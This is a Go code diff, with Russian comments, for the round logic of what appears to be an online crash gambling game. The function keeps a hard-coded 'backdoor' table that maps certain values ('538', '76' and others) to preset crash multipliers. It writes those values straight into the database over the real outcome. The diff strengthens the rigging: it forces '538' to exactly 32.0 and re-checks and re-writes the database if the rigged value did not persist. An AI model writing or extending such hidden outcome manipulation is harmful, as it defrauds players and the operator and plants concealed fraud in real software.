@@ -131,7 +131,7 @@ func StartCrashGame() {
 			Multiplier float64
 			Name string
 		}{
-			{538.0, 32.0, "538"},
+			{538.0, 32.0, "538"},  // Гарантируем правильный множитель для 538
 			{76.0, 1.5, "76"},
 			{17216.0, 2.5, "17216"},
 			{372.0, 1.5, "372"},
@@ -146,10 +146,39 @@ func StartCrashGame() {
 					currentCrashGame.CrashPointMultiplier = backdoor.Multiplier
 					foundBackdoor = true
 					
+					// Специальная обработка для бэкдора 538
+					if backdoor.Name == "538" {
+						logger.Info("🔥 Special handling for backdoor 538 with exact multiplier 32.0 🔥")
+						// Дополнительно устанавливаем точное значение 32.0
+						currentCrashGame.CrashPointMultiplier = 32.0
+					}
+					
 					// Принудительно устанавливаем точное значение в базу через прямой SQL запрос
 					if err := db.DB.Exec("UPDATE crash_games SET crash_point_multiplier = ? WHERE id = ?", 
 						backdoor.Multiplier, currentCrashGame.ID).Error; err != nil {
 						logger.Error("Failed to update backdoor multiplier in DB: %v", err)
+					} else {
+						logger.Info("Successfully updated crash point multiplier to %.2f for game %d", 
+							backdoor.Multiplier, currentCrashGame.ID)
+						
+						// Двойная проверка сохранения для критических бэкдоров
+						if backdoor.Name == "538" || backdoor.Name == "76" {
+							logger.Info("Double-checking critical backdoor %s crash point...", backdoor.Name)
+							var checkGame models.CrashGame
+							if err := db.DB.First(&checkGame, currentCrashGame.ID).Error; err != nil {
+								logger.Error("Failed to read game after critical update: %v", err)
+							} else {
+								logger.Info("Confirmed: Game %d crash point set to %.2f", 
+									checkGame.ID, checkGame.CrashPointMultiplier)
+								
+								// Если значение все равно не сохранилось, делаем дополнительную попытку
+								if math.Abs(checkGame.CrashPointMultiplier - backdoor.Multiplier) > 0.001 {
+									logger.Error("⚠️ Critical backdoor multiplier mismatch! Fixing...")
+									db.DB.Exec("UPDATE crash_games SET crash_point_multiplier = ? WHERE id = ?", 
+										backdoor.Multiplier, currentCrashGame.ID)
+								}
+							}
+						}
 					}
 					break
 				}
